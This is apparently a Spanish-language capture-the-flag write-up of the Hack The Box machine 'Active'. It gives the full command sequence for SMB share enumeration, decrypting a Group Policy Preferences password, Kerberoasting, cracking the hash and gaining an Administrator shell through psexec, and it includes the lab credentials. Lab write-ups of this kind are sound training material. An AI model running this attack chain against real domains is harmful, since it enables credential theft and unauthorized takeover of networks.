# Active

## Información General

<h3> Dificultad: <img src="https://img.shields.io/badge/Facil-Green"> </h3>

<h3> Sistema operativo: Windows</h3>

<h3> Vulnerabilidad explotada: SMB Enumeration, Abusing GPP Passwords, Decrypting GPP Passwords - gpp-decrypt, Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation] </h3>

<h3> Fecha de resolución: 11/11/2025</h3>

<h3>Enlace de la mv: <a href="https://app.hackthebox.com/machines/148/information" target="_blank">Active</a></h3>

### *Leer el documentro en Ingles* <a href="active_ingles.md">Active</a>

## Reconocimiento

HTB nos proporciona la ip de la máquina objetivo **10.129.65.245**
Nuestra IP es : **10.10.14.110**

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a llamar **active.htb**

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.65.245
```

Su ttl es 128. Por tanto, es Window

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn active
```

<p align="center"> 
<img src="images/Pasted image 20251106154500.png" width="600" alt="Resultado de Nmap">
</p>

<p align="center"> 
<img src="images/Pasted image 20251106155234.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service      | Version                                                                                     |
| --------- | ------------ | ------------------------------------------------------------------------------------------- |
| 53        | domain       | Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)                              |
| 88        | kerberos-sec | Microsoft Windows Kerberos (server time: 2025-11-06 14:34:37Z)                              |
| 135       | msrpc        | Microsoft Windows RPC                                                                       |
| 139       | netbios-ssn  | syn-ack ttl 127 Microsoft Windows netbios-ssn                                               |
| 389       | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) |
| 445       | microsoft-ds | -                                                                                           |
| 464       | tcpwrapped   | -                                                                                           |
| 593       | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                                                         |
| 636       | tcpwrapped   | -                                                                                           |
| 3268      | ldap         | Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) |
| 3269      | tcpwrapped   |                                                                                             |
| 5722      | msrpc        | Microsoft Windows RPC                                                                       |
| 9389      | mc-nmf       | .NET Message Framing                                                                        |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                     |
| 49152/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49153/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49154/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49155/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49157/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.                                                          |
| 49158/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49162/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49166/tcp | msrpc        | Microsoft Windows RPC                                                                       |
| 49168/tcp | msrpc        | Microsoft Windows RPC                                                                       |

</div>

## Exploración

El puerto 53 es el protocolo DNS. Eso significa que en esta maquina hay un AD

Tenemos el protocolo **Samba** abierto que es el puerto **139**  y **445**.  Usaremos la herramienta crackmapexec para saber con que nos enfrentamos:

```
crackmapexec smb active
```

**SMB         active          445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)**

Estamos antes un máquina Windows 7 x64 bits
Tanto **nmap** como **crackmapexec** nos comenta que hay un dominio que se llama **active.htb**

Luego puedo usar herramienta como **smbmap** para saber si se nos comparte algún archivo y conocer los permisos que tiene

```
smbmap -H 10.129.65.245
```

<p align="center"> 
<img src="images/Pasted image 20251106162655.png" width="600" alt="Resultado de Nmap">
</p>

Averiguamos que hay en **Replication**

```
smbmap -H 10.129.65.245 -r Replication
```

<p align="center"> 
<img src="images/Pasted image 20251106163132.png" width="600" alt="Resultado de Nmap">
</p>

Me gustaría saber que hay dentro de **active.htb**, por tanto:

```
smbmap -H 10.129.65.245 -r Replication/active.htb
```

<p align="center"> 
<img src="images/Pasted image 20251106163333.png" width="600" alt="Resultado de Nmap">
</p>

Esto tiene una estructura a estilo **SYSVOL**. La idea ahora es encontrar un archivo que se llame **groups.xml**

```
smbmap -H 10.129.65.245 -r Replication/active.htb/Policies
```

<p align="center"> 
<img src="images/Pasted image 20251106163634.png" width="600" alt="Resultado de Nmap">
</p>

Hemos encontrado **Guid**, es básicamente el identificador de una Política de Grupo (Group Policy Object) y esto se encuetra en un SYSVOL

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
```

<p align="center"> 
<img src="images/Pasted image 20251110105222.png" width="600" alt="Resultado de Nmap">
</p>

Ahora la idea es seguir enumerando hasta encontrar un archivo llamado groups.xml

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/
```

<p align="center"> 
<img src="images/Pasted image 20251110110809.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/
```

<p align="center"> 
<img src="images/Pasted image 20251110110857.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
```

<p align="center"> 
<img src="images/Pasted image 20251110111129.png" width="600" alt="Resultado de Nmap">
</p>

Una vez encontrado el archivo **Groups.xml** lo descargamos

```
smbmap -H 10.129.60.254 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml/
```

<p align="center"> 
<img src="images/Pasted image 20251110111613.png" width="600" alt="Resultado de Nmap">
</p>

```
xmllint --format groups.xml | batcat --language=xml
```

<p align="center"> 
<img src="images/Pasted image 20251110113133.png" width="600" alt="Resultado de Nmap">
</p>

Usamos este comando para ver más bonito el archivo groups.xml

**userName** --> active.htb\SVC_TGS
**cpassword** --> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

pero el cpassword hay que pasarlo a texto claro por tanto usaremos la herramienta **gpp-decrypt**

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Resultado: GPPstillStandingStrong2k18

Una de las funciones de la herramienta **crackmapexec** es validar usuarios de AD. Si sale la **+** significa que existe, como es en este caso.

```
crackmapexec smb 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

<p align="center"> 
<img src="images/Pasted image 20251110121536.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, vamos a ver que nos encontramos en este usuario autentificado:

```
crackmapexec smb 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

<p align="center"> 
<img src="images/Pasted image 20251110122242.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
```

<p align="center"> 
<img src="images/Pasted image 20251110123102.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS
```

<p align="center"> 
<img src="images/Pasted image 20251110123903.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop
```

<p align="center"> 
<img src="images/Pasted image 20251110123943.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.60.254 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
```

Con este comando descargamos el archivo **user.txt**

<p align="center"> 
<img src="images/Pasted image 20251110124108.png" width="600" alt="Resultado de Nmap">
</p>

```
cat 10.129.60.254-Users_SVC_TGS_Desktop_user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251110124212.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, vamos a usar la herramienta **rpcclient** para la enumeracion de usuarios, grupos e información del sistema

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'enumdomusers'
```

<p align="center"> 
<img src="images/Pasted image 20251110142540.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'enumdomgroups'
```

<p align="center"> 
<img src="images/Pasted image 20251110151546.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'querydominfo'
```

<p align="center"> 
<img src="images/Pasted image 20251110142728.png" width="600" alt="Resultado de Nmap">
</p>

Ahora estando en este punto me gustaría saber que usuarios hay en el grupo **Domain Admins** para ello usamos el siguiente comando:

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'querygroupmem 0x200'
```

<p align="center"> 
<img src="images/Pasted image 20251110151622.png" width="600" alt="Resultado de Nmap">
</p>

```
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.129.60.254 -c 'queryuser 0x1f4'
```

<p align="center"> 
<img src="images/Pasted image 20251110151754.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, el usuario del grupo **Domain Admins** es **Administrator**

Para el uso de la siguiente herramienta hay que actualizar nuestra kali

```
sudo apt update
sudo apt install impacket-scripts python3-impacket
dpkg -L impacket-scripts | grep -i -E 'GetNP|NPUsers|getnp|npusers' || true
```

Esta herramienta llamada **GetNPUsers.py** instalada por primera vez aparece con el nombre **impacket-GetNPUsers**

<p align="center"> 
<img src="images/Pasted image 20251110155310.png" width="600" alt="Resultado de Nmap">
</p>

El objetivo con esta herramienta es intentar conseguir el hash de la contraseña del usuario **Administrator** pero no funcionara :(

```
impacket-GetNPUsers active.htb/ -no-pas -usersfile user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251110155443.png" width="600" alt="Resultado de Nmap">
</p>

User Administrator **doesn't have UF_DONT_REQUIRE_PREAUTH** set → esa cuenta exige pre-auth, por tanto no es vulnerable a AS-REP Roasting (no hay hash para crackear).

Usaremos otra herramienta, que se llama **GetUserSPNs** para averiguar el hash de del usuario **Administrator**

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

<p align="center"> 
<img src="images/Pasted image 20251111002310.png" width="600" alt="Resultado de Nmap">
</p>

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

<p align="center"> 
<img src="images/Pasted image 20251111002416.png" width="600" alt="Resultado de Nmap">
</p>

Una vez obtenido el hash del usuario **Administrator**, se usaría la herramienta **johntheripper**

```
john -w:$(locate rockyou.txt) hash.txt
```

<p align="center"> 
<img src="images/Pasted image 20251111002906.png" width="600" alt="Resultado de Nmap">
</p>

Por tanto, tenemos:

user: Administrator <br>
pass: Ticketmaster1968

Usamos la herramienta **crackmapexec** para validar esta cuenta

```
crackmapexec smb 10.129.60.254 -u 'Administrator' -p 'Ticketmaster1968'
```

<p align="center"> 
<img src="images/Pasted image 20251111003345.png" width="600" alt="Resultado de Nmap">
</p>

sale las + en positivo y además sale el **Pwn3d!** significa que es el super usuario del dominio

Accedemos con la herramienta **psexec** con el objetivo de obtener shell interactivo

```
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.60.254
```

<p align="center"> 
<img src="images/Pasted image 20251111004541.png" width="600" alt="Resultado de Nmap">
</p>

Una dentro obtenemos la flag del usuario Administator

```
type C:\Users\Administrator\Desktop\root.txt
```

<p align="center"> 
<img src="images/Pasted image 20251111004923.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

Recomiendo encarecidamente la máquina **active** de **HTB** si estás empezando con **Active Directory (AD)**.  
Comencé investigando el servicio Samba usando **smbmap**, donde encontré el fichero **Groups.xml**. En ese archivo aparecía el usuario **SVC_TGS** con una contraseña cifrada; la convertí a texto plano con **gpp-decrypt**. Con **crackmapexec** confirmé el dominio del Active Directory (**active.htb**). Recuerda que la IP de la máquina debe estar apuntada en **/etc/hosts** con el nombre del dominio.

A continuación volví a enumerar recursos con **smbmap** de forma manual pero con las credenciales que obtuve anteriormente, gracias a ello, obtuve la primera flag. Con **rpcclient** enumeré usuarios y grupos, me llamó la atención el grupo **Domain Admins**. Además, con **rpcclient** identifiqué al usuario **Administrator**. Para obtener la contraseña del administrador usé **GetUserSPNs**, que me devolvió el hash del servicio, y lo descifré con **John the Ripper**. Finalmente, con el super usuario y la contraseña utilicé **psexec** para conseguir una shell interactiva y así obtener la flag del usuario root/Administrator.